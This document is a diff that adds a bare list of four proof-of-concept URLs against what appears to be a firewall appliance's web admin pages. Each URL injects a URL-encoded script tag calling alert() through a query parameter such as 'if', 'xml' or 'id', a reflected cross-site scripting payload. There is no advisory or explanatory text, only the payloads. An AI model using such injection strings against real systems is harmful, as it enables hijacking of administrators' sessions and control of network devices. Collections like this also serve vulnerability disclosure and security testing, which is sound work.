@@ -1,0 +1,11 @@
+
+https://www.example.com/pkg_edit.php?xml=olsrd.xml&amp;id=%22/%3E%3Cscript%3Ealert%282%29;%3C/script%3E
+
+
+https://www.example.com/pkg.php?xml=jailctl.xm%27l%22/%3E%3Cscript%3Ealert%281%29;%3C/script%3E
+
+
+https://www.example.com/status_graph.php?if=%22/%3E%3Cscript%3Ealert%281%29;%3C/script%3E
+
+
+https://www.example.com/interfaces.php?if=wan%22%22/%3E%3Cscript%3Ealert%281%29;%3C/script%3E
